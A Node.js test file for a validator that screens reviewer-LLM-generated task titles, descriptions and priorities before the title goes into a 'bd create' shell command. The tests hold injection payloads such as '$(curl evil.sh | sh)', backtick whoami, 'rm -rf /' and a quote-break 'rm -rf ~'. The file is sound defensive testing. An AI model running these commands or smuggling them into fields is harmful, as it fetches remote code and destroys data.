import { test, describe } from 'node:test';
import assert from 'node:assert';
import { validateNewTask } from '../auto-sprint/runner.js';

// apra-fleet-unw2.3 (N3): reviewer-authored newTasks (title/description/
// priority) are LLM output whose own context includes the diff under
// review. Before this fix, runner.js interpolated them into a
// `bd create "..."` shell command with only double-quotes escaped --
// backticks and `$(...)` survive inside POSIX double quotes, and a
// trailing backslash can neutralize the escaping entirely. These tests
// pin validateNewTask() -- the allowlist gate that now runs BEFORE any
// interpolation -- so no adversarial payload of this shape can ever reach
// `command()` again.
//
// apra-fleet-eft.56.1: `description` no longer reaches that shell
// interpolation at all -- createChildBeadWithAllocatedId() now writes it to
// a local temp file and hands it to `bd create --body-file`, so it is
// validated against the more permissive SAFE_DESCRIPTION_RE (ASCII-
// printable, non-empty) instead of SAFE_TEXT_RE. `title` is still
// interpolated inline into the `bd create "..."` command string, so it
// keeps the strict SAFE_TEXT_RE allowlist.

describe('validateNewTask', () => {
    test('accepts a realistic, safe title/description/priority', () => {
        const result = validateNewTask({
            title: 'Fix 401 handling in client.js',
            description: "Add retry logic (max 3x), per review notes: see PR 12, section 3.1 - it's required.",
            priority: 'P2',
        });
        assert.strictEqual(result.ok, true);
        assert.strictEqual(result.title, 'Fix 401 handling in client.js');
        assert.strictEqual(result.priority, 'P2');
    });

    test('accepts all valid priority values P0-P4', () => {
        for (const priority of ['P0', 'P1', 'P2', 'P3', 'P4']) {
            const result = validateNewTask({ title: 'Safe title', description: 'Safe description.', priority });
            assert.strictEqual(result.ok, true, `expected P-priority '${priority}' to be accepted`);
        }
    });

    test('rejects bogus priority values', () => {
        for (const priority of ['urgent', 'P99', '', 'p1', 'P1 ', ' P1', 'P1;rm -rf', undefined, null]) {
            const result = validateNewTask({ title: 'Safe title', description: 'Safe description.', priority });
            assert.strictEqual(result.ok, false, `expected priority ${JSON.stringify(priority)} to be rejected`);
            assert.match(result.reason, /priority/);
        }
    });

    test('rejects $(...) command substitution in title', () => {
        const result = validateNewTask({
            title: 'Innocuous title $(curl evil.sh | sh)',
            description: 'Safe description.',
            priority: 'P2',
        });
        assert.strictEqual(result.ok, false);
        assert.match(result.reason, /title/);
    });

    test('accepts $(...) in description (no longer shell-interpolated -- see eft.56.1)', () => {
        const result = validateNewTask({
            title: 'Safe title',
            description: 'Do the thing $(curl evil.sh | sh) after this.',
            priority: 'P2',
        });
        assert.strictEqual(result.ok, true);
        assert.strictEqual(result.description, 'Do the thing $(curl evil.sh | sh) after this.');
    });

    test('rejects backticks in title', () => {
        const result = validateNewTask({
            title: 'Run `whoami` and report',
            description: 'Safe description.',
            priority: 'P1',
        });
        assert.strictEqual(result.ok, false);
        assert.match(result.reason, /title/);
    });

    test('accepts backticks-as-text in description (no longer shell-interpolated -- see eft.56.1)', () => {
        const result = validateNewTask({
            title: 'Safe title',
            description: 'Payload: `rm -rf /` embedded here.',
            priority: 'P1',
        });
        assert.strictEqual(result.ok, true);
        assert.strictEqual(result.description, 'Payload: `rm -rf /` embedded here.');
    });

    test('rejects a trailing backslash (quote-escape trick)', () => {
        const result = validateNewTask({
            title: 'Safe-looking title\\',
            description: 'Safe description.',
            priority: 'P3',
        });
        assert.strictEqual(result.ok, false);
        assert.match(result.reason, /title/);
    });

    test('accepts a trailing backslash in description (no longer shell-interpolated -- see eft.56.1)', () => {
        const result = validateNewTask({
            title: 'Safe title',
            description: 'Safe-looking description\\',
            priority: 'P3',
        });
        assert.strictEqual(result.ok, true);
        assert.strictEqual(result.description, 'Safe-looking description\\');
    });

    test('rejects a literal double-quote (would close the bd create quoting early)', () => {
        const result = validateNewTask({
            title: 'Title" ; rm -rf ~ ; echo "pwned',
            description: 'Safe description.',
            priority: 'P2',
        });
        assert.strictEqual(result.ok, false);
        assert.match(result.reason, /title/);
    });

    test('accepts a bare dollar sign in description (no longer shell-interpolated -- see eft.56.1)', () => {
        const result = validateNewTask({
            title: 'Safe title',
            description: 'Cost is $100 -- not a real payload but still outside the old allowlist.',
            priority: 'P2',
        });
        assert.strictEqual(result.ok, true);
        assert.strictEqual(result.description, 'Cost is $100 -- not a real payload but still outside the old allowlist.');
    });

    test('accepts technical characters (=, &, +, quotes) in description -- apra-fleet-eft.56', () => {
        const result = validateNewTask({
            title: 'Fix env-var handling',
            description: 'Set APRA_FLEET_BD_MOCK=off; also test accessToken + synthesized & "quoted" values.',
            priority: 'P1',
        });
        assert.strictEqual(result.ok, true);
        assert.strictEqual(result.description, 'Set APRA_FLEET_BD_MOCK=off; also test accessToken + synthesized & "quoted" values.');
    });

    test('rejects non-ASCII characters in description (repo-wide ASCII-only convention)', () => {
        // The description below embeds a genuine non-ASCII code point via a
        // JS unicode escape sequence (not a literal byte), so this source
        // file itself stays ASCII-only per repo convention while still
        // exercising SAFE_DESCRIPTION_RE's rejection of non-ASCII at runtime.
        const result = validateNewTask({
            title: 'Safe title',
            description: 'Non-ASCII payload: caf\u00e9.',
            priority: 'P2',
        });
        assert.strictEqual(result.ok, false);
        assert.match(result.reason, /description/);
    });

    test('rejects empty title/description', () => {
        assert.strictEqual(validateNewTask({ title: '', description: 'x.', priority: 'P2' }).ok, false);
        assert.strictEqual(validateNewTask({ title: 'x', description: '', priority: 'P2' }).ok, false);
    });

    test('rejects non-string / missing fields gracefully (no throw)', () => {
        assert.doesNotThrow(() => validateNewTask({}));
        assert.doesNotThrow(() => validateNewTask({ title: 123, description: null, priority: undefined }));
        assert.strictEqual(validateNewTask({}).ok, false);
    });
});
